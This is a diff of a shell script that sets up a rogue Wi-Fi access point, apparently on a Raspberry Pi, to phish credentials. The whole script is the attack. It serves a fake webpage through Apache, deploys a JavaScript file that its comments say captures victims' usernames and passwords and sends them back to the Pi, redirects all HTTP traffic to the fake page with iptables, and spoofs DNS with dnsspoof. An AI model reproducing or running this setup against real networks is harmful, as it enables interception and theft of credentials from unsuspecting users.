@@ -1,23 +1,35 @@
 #!/bin/sh
 
-name="wlan0"
-
+#copy the webpage to the apache's directory and this will show the victiom once they connect to the server
 cp index.html /var/www/html/index.html
-cp steal.js /var/www/html/aj3.js
+#the js script for capturing the password and username and send it back to the raspberry Pi
+cp aj3.js /var/www/html/
 
+#lanuch the apache webserver
+/ect/init.d/apache2 start
+#setup the Access Point and set its gateway 
 ifconfig at0 10.0.0.1 up
+#setup the netmask
 ifconfig at0 10.0.0.1 netmask 255.255.255.0
+#allow Routing and forwarding in this machine
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-cp dhcpd.conf /etc/dhcp/dhcpd.conf
-dnsmasq -C dnsmasq.conf -d
+#copy the conf file to the dhcp directory
+cp ./conf/dhcpd.conf /etc/dhcp/
+#apply the dnsmasq.conf 
+dnsmasq -C ./conf/dnsmasq.conf -d
 #killall dnsmasq dhcpd isc-dhcp-server
 /etc/init.d/dnsmasq start
 
+#this is for setting the firewall rules by using iptables
+
+#clean all the rules firstly 
 iptables --flush
+#add the rules in net address translate table 
 iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
 iptables --append FORWARD --in-interface at0 -j ACCEPT
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
 iptables -t nat -A POSTROUTING -j MASQUERADE
+
 
 dnsspoof -i at0
